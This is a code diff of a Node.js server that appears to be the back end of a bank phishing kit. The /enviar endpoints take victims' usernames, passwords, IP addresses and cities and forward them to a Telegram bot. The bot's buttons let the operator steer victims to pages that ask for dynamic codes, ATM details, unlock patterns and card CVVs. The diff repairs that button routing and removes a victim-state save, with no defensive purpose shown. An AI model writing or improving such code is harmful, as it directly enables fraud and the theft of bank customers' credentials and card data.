@@ -23,7 +23,7 @@ if (!fs.existsSync(CLIENTES_DIR)) {
   fs.mkdirSync(CLIENTES_DIR);
 }
 
-// 🧹 Limpieza automática de archivos viejos
+// 🧹 Limpieza automática
 setInterval(() => {
   const files = fs.readdirSync(CLIENTES_DIR);
   const ahora = Date.now();
@@ -104,7 +104,7 @@ Secuencia: <code>${patron}</code>
       inline_keyboard: [
         [
           { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-          { text: "🏧CAJERO", callback_data: `errortok:${txid}` },
+          { text: "🏧CAJERO", callback_data: `cajero:${txid}` },
           { text: "🔐PATRON", callback_data: `patron:${txid}` }
         ],
         [
@@ -155,8 +155,8 @@ app.post('/enviar', async (req, res) => {
     inline_keyboard: [
       [
         { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-        { text: "🏧CAJERO", callback_data: `errortok:${txid}` },
-        { text: "🔐PATRON", callback_data: `errortok:${txid}` }
+        { text: "🏧CAJERO", callback_data: `cajero:${txid}` },
+        { text: "🔐PATRON", callback_data: `patron:${txid}` }
       ],
       [
         { text: "💳C3VV", callback_data: `ceve:${txid}` },
@@ -191,16 +191,12 @@ app.post('/enviar3', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
-  // 👉 Guardar cliente en estado "esperando" (para que no rebote a esemese.html)
-  const cliente = { status: "esperando", usar, clavv, preguntas: [], ip, ciudad };
-  guardarCliente(txid, cliente);
-
   const keyboard = {
     inline_keyboard: [
       [
         { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-        { text: "🏧CAJERO", callback_data: `errortok:${txid}` },
-        { text: "🔐PATRON", callback_data: `errortok:${txid}` }
+        { text: "🏧CAJERO", callback_data: `cajero:${txid}` },
+        { text: "🔐PATRON", callback_data: `patron:${txid}` }
       ],
       [
         { text: "💳C3VV", callback_data: `ceve:${txid}` },
